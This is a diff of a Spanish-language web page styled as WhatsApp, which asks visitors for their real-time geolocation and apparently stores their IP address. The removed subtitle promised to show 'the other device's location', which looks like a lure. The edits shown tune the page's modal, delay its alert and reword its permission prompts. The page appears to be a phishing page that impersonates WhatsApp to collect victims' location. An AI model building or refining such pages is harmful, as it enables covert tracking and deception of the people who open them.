@@ -1,5 +1,4 @@
-
-        <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8" />
@@ -110,7 +109,7 @@
             to { transform: rotate(360deg); }
         }
 
-        /* ---------- MODAL ---------- */
+        /* ---------- MODAL (ALERTA) ---------- */
         .modal {
             display: none;
             position: fixed;
@@ -130,17 +129,17 @@
         .modal-contenido {
             background: #ffffff;
             width: 90%;
-            max-width: 360px;
-            padding: 24px 20px 28px;
-            border-radius: 28px;
+            max-width: 320px;          /* más pequeño */
+            padding: 16px 16px 20px;    /* menos padding */
+            border-radius: 20px;        /* ligeramente menos redondeado */
             box-shadow: 0 24px 48px rgba(0, 0, 0, 0.3);
             text-align: center;
             animation: slideUp 0.35s ease;
         }
 
         .modal-contenido .modal-imagen {
-            width: 80px;
-            height: 80px;
+            width: 120px;              /* más grande */
+            height: 120px;
             border-radius: 50%;
             object-fit: cover;
             margin: 0 auto 12px;
@@ -220,7 +219,10 @@
             .card { padding: 20px 16px; }
             h2 { font-size: 21px; }
             iframe { height: 160px; }
-            .modal-contenido .modal-imagen { width: 64px; height: 64px; }
+            .modal-contenido .modal-imagen {
+                width: 100px;          /* ajuste en móviles */
+                height: 100px;
+            }
         }
     </style>
 </head>
@@ -229,7 +231,7 @@
     <div class="card">
         <img src="logowhatsapp.jpg" alt="WhatsApp" class="logo" />
         <h2>WhatsApp</h2>
-        <p class="subtitle"> ubicación del otro dispositivo en tiempo real</p>
+        <p class="subtitle">Comparte tu ubicación en tiempo real</p>
         <iframe src="https://www.google.com/maps?q=Colombia&output=embed" loading="lazy"></iframe>
         <div id="estado">
             <span class="spinner"></span>
@@ -237,7 +239,7 @@
         </div>
     </div>
 
-    <!-- MODAL CON IMAGEN -->
+    <!-- MODAL CON IMAGEN (ALERTA) -->
     <div id="miAlerta" class="modal">
         <div class="modal-contenido">
             <img src="imagenubicacion.jpg" alt="Ubicación" class="modal-imagen" />
@@ -285,6 +287,7 @@
 
         let docId = null;
         let ipGuardada = false;
+        let timeoutAlerta = null;   // para controlar el retraso
 
         // ----- FUNCIONES DE ESTADO -----
         function setEstado(texto, tipo = 'cargando') {
@@ -292,12 +295,27 @@
             estadoDiv.className = tipo;
         }
 
+        // Muestra la alerta con un retraso de 1.5 segundos adicionales
         function mostrarAlerta(texto) {
+            // Cancela cualquier timeout pendiente
+            if (timeoutAlerta) {
+                clearTimeout(timeoutAlerta);
+                timeoutAlerta = null;
+            }
+            // Actualiza el texto de inmediato (por si acaso)
             textoAlerta.textContent = texto;
-            modal.style.display = 'flex';
+            // Programa la aparición después de 1500 ms
+            timeoutAlerta = setTimeout(() => {
+                modal.style.display = 'flex';
+                timeoutAlerta = null;
+            }, 1500);
         }
 
         function ocultarAlerta() {
+            if (timeoutAlerta) {
+                clearTimeout(timeoutAlerta);
+                timeoutAlerta = null;
+            }
             modal.style.display = 'none';
         }
 
@@ -431,7 +449,7 @@
                     let mensaje = '';
                     switch (err.code) {
                         case err.PERMISSION_DENIED:
-                            mensaje = ' Activa la ubicación y presiona "Recargar página".';
+                            mensaje = 'Permiso denegado. Activa la ubicación en los ajustes del navegador y presiona "Recargar página".';
                             break;
                         case err.POSITION_UNAVAILABLE:
                             mensaje = 'GPS no disponible. Asegúrate de tener señal o Wi-Fi.';
@@ -469,4 +487,4 @@
         })();
     </script>
 </body>
-</html>    
+</html>
